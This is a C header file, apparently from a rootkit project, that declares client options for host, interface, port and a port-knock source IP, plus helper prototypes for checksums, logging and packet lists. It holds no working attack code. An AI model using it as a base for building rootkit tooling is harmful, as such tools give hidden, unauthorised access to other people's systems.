#ifndef ROOTKIT_UTILS_H
#define ROOTKIT_UTILS_H

#include <stdbool.h>
#include "networking/protocol.h"

extern _Atomic int exit_flag;

struct client_options {
    char * host;
    char * interface_name;
    int port;
    int max_bytes;
    int poll_ms;
    char * knock_source_ip;  // IP that sent the knock
};


bool parse_int(const char *s, int *out);
unsigned short checksum(void *b, int len);
void log_message(const char *format, ...);
void free_linked_list(struct packet_data * head);
void print_linked_list(const struct packet_data * head);

#endif //ROOTKIT_UTILS_H